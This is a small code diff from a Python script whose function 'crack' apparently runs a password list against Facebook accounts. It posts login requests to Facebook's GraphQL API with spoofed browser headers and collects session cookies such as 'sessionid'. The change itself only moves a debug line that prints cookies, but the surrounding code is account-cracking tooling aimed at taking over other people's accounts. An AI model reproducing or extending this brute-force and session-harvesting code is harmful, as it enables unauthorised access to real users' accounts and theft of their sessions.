@@ -124,6 +124,7 @@ def crack(uid, password_list, total_count):
             'fr': fr,
             'dpr': '2.75',
             'wd': '980x1040',}
+            print(cookies)
             headers = {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -222,7 +223,6 @@ def crack(uid, password_list, total_count):
     'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
 }
             # Make API request
-            print(cookies)
             response = session.post('https://www.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
